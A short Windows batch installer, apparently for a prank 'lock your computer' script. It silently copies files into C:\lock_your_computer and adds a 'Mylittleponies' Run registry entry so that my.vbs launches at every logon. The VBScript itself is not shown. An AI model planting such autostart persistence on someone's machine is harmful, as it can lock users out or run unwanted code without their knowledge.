@echo off
mkdir C:\lock_your_computer
if NOT exist C:\Temp mkdir C:\Temp
xcopy /E /q /Y MLP C:\lock_your_computer > nul
xcopy /Y MLP_uninstall.bat C:\temp > nul
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V Mylittleponies /T REG_SZ /F /D "c:\lock_your_computer\my.vbs"
start c:\lock_your_computer\my.vbs
exit
